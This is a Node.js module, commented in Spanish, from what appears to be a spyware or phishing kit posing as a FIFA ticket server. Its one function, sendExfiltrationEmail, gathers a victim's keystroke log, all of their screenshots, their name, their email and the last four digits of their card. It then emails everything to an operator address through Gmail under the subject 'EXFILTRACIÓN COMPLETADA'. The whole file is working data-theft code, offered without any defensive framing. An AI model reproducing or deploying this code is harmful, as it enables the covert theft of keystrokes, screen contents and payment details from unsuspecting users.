const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

// Configurar el envio de gmail (Usa una "Contraseña de aplicación" de Google)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

// Función auxiliar para contar registros en el log
function getLogCount(logFile) {
  try {
    if (!fs.existsSync(logFile)) return 0;
    const content = fs.readFileSync(logFile, "utf-8");
    return content.split("\n").filter((line) => line.trim().length > 0).length;
  } catch {
    return 0;
  }
}

// Función principal para armar y enviar el correo de exfiltración
async function sendExfiltrationEmail(data, screenshotsDir, logFile) {
  const { user, email, match, totalAmount, seats, cardLastFour } = data;
  const safeUser = (user || "desconocido").replace(/\s/g, "_");

  // Obtener TODAS las capturas asociadas a este usuario
  const files = fs.readdirSync(screenshotsDir);
  const userScreenshots = files.filter((f) => f.includes(safeUser));

  console.log(`   Se encontraron ${userScreenshots.length} capturas de pantalla`);

  // Preparar todos los adjuntos (empezando por los logs de texto)
  const attachments = [
    {
      filename: "logs_completos.txt",
      path: logFile,
      contentType: "text/plain",
    },
  ];

  // Agregar TODAS las capturas del usuario
  userScreenshots.forEach((fileName, index) => {
    const filePath = path.join(screenshotsDir, fileName);
    if (fs.existsSync(filePath)) {
      const ext = path.extname(fileName).toLowerCase();
      const contentType = ext === '.jpg' || ext === '.jpeg' ? 'image/jpeg' : 'image/png';
      attachments.push({
        filename: `screenshot_${index + 1}${ext}`,
        path: filePath,
        contentType: contentType,
      });
      console.log(`   Agregado: ${fileName}`);
    }
  });

  const mailOptions = {
    from: `Servidor FIFA <${process.env.EMAIL_USER}>`,
    to: process.env.EMAIL_DESTINATION || process.env.EMAIL_USER,
    subject: `EXFILTRACIÓN COMPLETADA: ${user} - ${new Date().toLocaleString()}`,
    html: `
          <div style="font-family: monospace; padding: 20px; color: #000;">
          <div style="max-width: 500px; margin: auto; border: 1px solid #ccc; padding: 20px;">
              <h2 style="color: #d32f2f; margin-top: 0;">REPORTE DE EXFILTRACION</h2>
              <p>
                  Usuario: ${user}<br>
                  Correo: ${email}<br>
                  ${cardLastFour ? `Tarjeta: ****${cardLastFour}<br>` : ""}
                  Fecha: ${new Date().toLocaleString()}
              </p>
              <hr>
              <strong>DATOS CAPTURADOS:</strong>
              <ul style="padding-left: 20px;">
                  <li>Logs de Teclado: ${getLogCount(logFile)} registros</li>
                  <li>Capturas de Pantalla: ${userScreenshots.length}</li>
              </ul>
              <p style="font-size: 11px; color: #666;">Archivos adjuntos en el correo.</p>
          </div>
          `,
    attachments: attachments,
  };

  const info = await transporter.sendMail(mailOptions);
  return { info, attachmentsCount: attachments.length, screenshotsCount: userScreenshots.length };
}

module.exports = { sendExfiltrationEmail };